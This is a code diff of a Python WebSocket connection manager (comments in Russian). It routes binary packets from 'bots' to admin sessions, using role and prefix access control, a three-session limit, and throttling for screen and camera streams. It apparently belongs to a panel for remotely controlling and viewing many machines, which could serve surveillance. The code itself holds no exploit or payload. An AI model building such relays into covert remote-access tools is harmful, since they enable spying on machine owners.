@@ -1,109 +1,103 @@
 # backend/API/connection_manager.py
 
 import asyncio
-from typing import Any, Dict, List, Set, Optional
-
+from typing import Any, Dict, List, Optional, Tuple
 import backend.LoggerWrapper as logger
+from backend.Services.network import NetworkProtocol
 
 class ConnectionManager:
     """
-    Маршрутизатор бинарных пакетов V7.2 между ботами и WebSocket-клиентами.
-    Реализует RBAC на основе префиксов BotID.
+    Маршрутизатор бинарных пакетов V8.0 между ботами и WebSocket-клиентами.
+    Поддерживает RBAC (роли и префиксы), троттлинг тяжелого трафика и лимит сессий.
     """
 
     def __init__(self) -> None:
-        self.active_users: Dict[str, List[Any]] = {}
-        self.tunnels: Dict[str, List[Any]] = {} 
+        # Храним данные пользователя для каждого сокета: {WebSocket: {"login": str, "role": str, "prefix": str}}
+        self.active_sessions: Dict[Any, Dict[str, Any]] = {}
+        # Очереди и задачи на отправку
         self.queues: Dict[Any, asyncio.Queue] = {}
         self.send_tasks: Dict[Any, asyncio.Task] = {}
+        # Счётчик окон для лимита (3 на логин)
+        self.login_counts: Dict[str, int] = {}
 
     async def connect(self, websocket: Any, login: str, user_data: Dict[str, Any]) -> bool:
-        """Регистрация сессии админа с ограничением в 3 окна."""
-        await websocket.accept()
-        
-        current_sessions = self.active_users.get(login, [])
-        if len(current_sessions) >= 3:
+        """Регистрация новой сессии админа с проверкой лимита окон."""
+        # Проверка лимита: максимум 3 окна
+        current_count = self.login_counts.get(login, 0)
+        if current_count >= 3:
+            logger.Log.warning(f"[API] Denied connection for {login}: session limit reached (3)")
             await websocket.close(code=1008)
             return False
 
-        # Очередь на 200 пакетов. Если админ не успевает выгребать данные (слабый инет), 
-        # сервер не упадет, а начнет дропать старые пакеты через троттлинг.
+        await websocket.accept()
+        
+        # Настройка инфраструктуры отправки
         outgoing_queue: asyncio.Queue = asyncio.Queue(maxsize=200)
         self.queues[websocket] = outgoing_queue
         self.send_tasks[websocket] = asyncio.create_task(self._writer(websocket, outgoing_queue))
         
-        self.active_users.setdefault(login, []).append(websocket)
-        
-        user_prefix: str = user_data.get("prefix", "NONE")
-        user_role: str = user_data.get("role", "user")
-        
-        # Логика доступа: Admin видит ALL + свой префикс, User только свой префикс.
-        groups = {user_prefix}
-        if user_role == "admin":
-            groups.add("ALL")
-            
-        for group in groups:
-            self.tunnels.setdefault(group, []).append(websocket)
+        # Сохраняем данные сессии
+        self.active_sessions[websocket] = {
+            "login": login,
+            "role": user_data.get("role", "user"),
+            "prefix": user_data.get("prefix", "NONE")
+        }
+        self.login_counts[login] = current_count + 1
 
-        logger.Log.info(f"[{self.__class__.__name__}] [+] {login} ({user_prefix})")
+        logger.Log.info(f"[API] [+] Session started: {login} (Role: {user_data.get('role')})")
         return True
 
     def broadcast_packet_sync(self, packet: bytes) -> None:
         """
-        Разбор заголовка V7.2 и рассылка пакета целевым WebSocket-туннелям.
+        Разбор заголовка V8.0 и интеллектуальная рассылка пакета целевым админам.
         """
-        if len(packet) < 6:
+        if len(packet) < 8:
             return
 
-        # Парсим заголовок V7.2: [1b id_len][1b mod_len][4b pay_len]
+        # Извлекаем длины сегментов по протоколу V8.0
         id_len = packet[0]
-        mod_len = packet[1]
+        mod_body_len = int.from_bytes(packet[1:3], "big")
         
         try:
-            # Извлекаем ID (смещение 6)
-            bot_id_bytes = packet[6 : 6 + id_len]
-            bot_id = bot_id_bytes.decode(errors="ignore").strip()
-            
-            # Извлекаем Название модуля для проверки на мультимедиа (смещение 6 + id_len)
-            module_name_bytes = packet[6 + id_len : 6 + id_len + mod_len]
+            # Извлекаем ID отправителя
+            bot_id = packet[8 : 8 + id_len].decode(errors="ignore")
+            # Извлекаем метаданные для проверки "тяжести" пакета
+            meta_raw = packet[8 + id_len : 8 + id_len + mod_body_len].decode(errors="ignore")
         except Exception:
             return
 
-        # По ТЗ V7.2 префикс — это всё, что до первого дефиса
-        bot_prefix = bot_id.split("-")[0] if "-" in bot_id else "NONE"
-        
-        # Собираем уникальный сет получателей (кто-то может быть в ALL и в RU одновременно)
-        target_websockets = set(self.tunnels.get(bot_prefix, [])) | set(self.tunnels.get("ALL", []))
-        
-        if not target_websockets:
+        # Логика троттлинга: проверяем модуль в метаданных (V8.0: "Module:Type:Action:Extra")
+        is_heavy = any(tag in meta_raw for tag in ["Preview", "Screen", "Camera", "Frame"])
+
+        # Рассылка всем подходящим админам
+        for websocket, user_info in self.active_sessions.items():
+            # Проверка доступа через NetworkProtocol (Admin видит всё, User по префиксу)
+            # Если пакет от "SERVER", он проходит глобально, но фильтруется по логике SystemState
+            if bot_id == "SERVER" or NetworkProtocol.has_access(user_info, bot_id):
+                self._push_to_queue(websocket, packet, is_heavy)
+
+    def _push_to_queue(self, websocket: Any, packet: bytes, is_heavy: bool) -> None:
+        """Добавление пакета в очередь конкретного сокета с троттлингом."""
+        queue = self.queues.get(websocket)
+        if not queue:
             return
 
-        # Троттлинг для тяжелых модулей (Screen, Preview, Camera)
-        is_heavy = any(x in module_name_bytes for x in [b"Screen", b"Preview", b"Frame", b"Camera"])
-
-        for websocket in target_websockets:
-            queue = self.queues.get(websocket)
-            if not queue:
-                continue
-            
-            # Если очередь полна и это тяжелый пакет — освобождаем место под актуальный кадр
-            if is_heavy and queue.full():
-                try:
-                    # Выбрасываем 10 старых кадров, чтобы не было задержки в стриме
-                    for _ in range(10):
-                        if not queue.empty():
-                            queue.get_nowait()
-                except Exception:
-                    pass
-
+        # Если стрим забивает канал, выкидываем старые кадры
+        if is_heavy and queue.full():
             try:
-                queue.put_nowait(packet)
-            except asyncio.QueueFull:
-                # Если даже после чистки или для обычных данных очередь полна — пакет теряется
+                for _ in range(10):
+                    if not queue.empty():
+                        queue.get_nowait()
+            except Exception:
                 pass
 
+        try:
+            queue.put_nowait(packet)
+        except asyncio.QueueFull:
+            pass
+
     async def _writer(self, websocket: Any, queue: asyncio.Queue) -> None:
-        """Асинхронная выгрузка очереди в WebSocket."""
+        """Асинхронный воркер для выгрузки очереди в WebSocket."""
         try:
             while True:
                 packet_to_send = await queue.get()
@@ -112,27 +106,23 @@ class ConnectionManager:
         except Exception:
             pass 
 
-    def disconnect(self, websocket: Any, login: str) -> None:
+    def disconnect(self, websocket: Any) -> None:
         """Полная очистка ресурсов при закрытии сессии."""
-        if (task := self.send_tasks.pop(websocket, None)):
-            task.cancel()
+        if websocket in self.active_sessions:
+            session = self.active_sessions.pop(websocket)
+            login = session["login"]
             
-        self.queues.pop(websocket, None)
-        
-        # Чистим списки активных юзеров
-        if login in self.active_users:
-            if websocket in self.active_users[login]:
-                self.active_users[login].remove(websocket)
-            if not self.active_users[login]:
-                self.active_users.pop(login)
-                
-        # Чистим туннели
-        for group in list(self.tunnels.keys()):
-            if websocket in self.tunnels[group]:
-                self.tunnels[group].remove(websocket)
-            if not self.tunnels[group]:
-                self.tunnels.pop(group)
+            # Уменьшаем счетчик окон
+            if login in self.login_counts:
+                self.login_counts[login] -= 1
+                if self.login_counts[login] <= 0:
+                    self.login_counts.pop(login)
 
-        logger.Log.info(f"[{self.__class__.__name__}] [-] {login}")
+            # Останавливаем воркер
+            if (task := self.send_tasks.pop(websocket, None)):
+                task.cancel()
+            
+            self.queues.pop(websocket, None)
+            logger.Log.info(f"[API] [-] Session closed: {login}")
 
 manager: ConnectionManager = ConnectionManager()
